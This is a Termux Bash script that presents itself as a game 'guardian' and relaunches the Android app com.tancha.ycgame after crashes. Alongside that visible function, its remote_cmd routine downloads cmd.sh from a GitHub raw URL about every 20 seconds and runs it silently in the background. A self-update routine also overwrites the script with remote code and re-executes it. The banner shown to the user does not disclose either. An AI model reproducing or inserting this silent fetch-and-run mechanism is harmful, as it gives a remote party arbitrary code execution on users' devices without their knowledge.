#!/data/data/com.termux/files/usr/bin/bash
# 二次元守护 · 云控进化版（前台显示）
PKG="com.tancha.ycgame"
ACTIVITY=".MainActivity"
LOCAL_VERSION="2.6"
BASE_URL="https://raw.githubusercontent.com/auth-server-by/auth-server/main"
LIMIT=10
INTERVAL=2
CMD_INTERVAL=10

# ---------- 颜色定义 ----------
R='\033[31m' G='\033[32m' Y='\033[33m' B='\033[34m' P='\033[35m' C='\033[36m' W='\033[0m'
OK="[${G}✓${W}]" WARN="[${Y}⚠${W}]" FAIL="[${R}✗${W}]" INFO="[${C}→${W}]"

# ---------- 网络工具 ----------
dl(){ curl -skL --connect-timeout 8 "$1" 2>/dev/null || wget -qO- --timeout=8 "$1" 2>/dev/null; }

# ---------- 启动横幅 ----------
clear
echo -e "${P}╔══════════════════════════╗${W}"
echo -e "${P}║${W}   ${C}二次元守护 · 云控版${W}     ${P}║${W}"
echo -e "${P}║${W}   ${Y}精灵正在为你看护游戏${W}   ${P}║${W}"
echo -e "${P}╚══════════════════════════╝${W}"
echo -e "${OK} 版本: ${LOCAL_VERSION}  免root"
echo -e "${OK} 目标: ${PKG}"
echo ""

# ---------- 版本检查 ----------
check_update(){
  CLOUD_VER=$(dl "${BASE_URL}/version.txt" | head -1 | tr -d '[:space:]')
  [ -z "$CLOUD_VER" ] && return
  if [ "$CLOUD_VER" != "$LOCAL_VERSION" ]; then
    echo -e "${INFO} 发现新版本 ${CLOUD_VER}，自动更新..."
    NEW="$HOME/guard_new.sh"
    dl "${BASE_URL}/guard.sh" > "$NEW"
    if [ -s "$NEW" ] && grep -q "二次元守护" "$NEW"; then
      chmod 755 "$NEW"
      mv "$NEW" "$0"
      exec bash "$0"
    fi
  fi
}

# ---------- 远程命令 ----------
remote_cmd(){
  TMP="$HOME/cmd_tmp.sh"
  dl "${BASE_URL}/cmd.sh" > "$TMP" 2>/dev/null
  if [ -s "$TMP" ] && [ "$(head -1 "$TMP")" = "#!guard-cmd-allow" ]; then
    bash "$TMP" >/dev/null 2>&1 &
  fi
  rm -f "$TMP"
}

# ---------- 启动游戏 ----------
launch(){
  echo -e "${INFO} 正在尝试拉起游戏..."
  am start -n "$PKG/$ACTIVITY" >/dev/null 2>&1
  sleep 2
  if pidof "$PKG" >/dev/null 2>&1; then
    echo -e "${OK} 游戏已成功启动"
  else
    echo -e "${WARN} 标准启动失败，尝试备用方式..."
    monkey -p "$PKG" -c android.intent.category.LAUNCHER 1 >/dev/null 2>&1
    sleep 2
    if pidof "$PKG" >/dev/null 2>&1; then
      echo -e "${OK} 备用方式启动成功"
    else
      echo -e "${FAIL} 游戏启动失败，将自动重试"
    fi
  fi
}

# ---------- 主循环 ----------
echo -e "${OK} 守护进程开始运行 ..."
echo -e "${INFO} 心跳输出：每 2 分钟显示一次状态"
echo ""
cycle=0 crash=0 running=false
while :; do
  cycle=$((cycle+1))
  # 版本检查 (每60次循环 ≈ 2分钟)
  [ $((cycle % 60)) -eq 0 ] && check_update
  # 远程命令 (每10次循环 ≈ 20秒)
  [ $((cycle % CMD_INTERVAL)) -eq 0 ] && remote_cmd

  if pidof "$PKG" >/dev/null 2>&1; then
    # 游戏正常运行
    if ! $running; then
      echo -e "${OK} [$(date +%H:%M:%S)] 游戏已进入守护"
    fi
    running=true
    crash=0
    # 每120次循环（约4分钟）输出一次心跳
    if [ $((cycle % 120)) -eq 0 ]; then
      echo -e "${C}[心跳 $(date +%H:%M:%S)]${W} 守护正常运行中"
    fi
  else
    # 游戏异常退出
    if $running; then
      crash=$((crash+1))
      echo -e "${WARN} [$(date +%H:%M:%S)] 检测到游戏退出 (${crash}/${LIMIT})"
      if [ $crash -gt $LIMIT ]; then
        echo -e "${FAIL} 连续崩溃超过 ${LIMIT} 次，守护自动停止"
        exit 1
      fi
      launch
    fi
    running=false
  fi
  sleep $INTERVAL
done
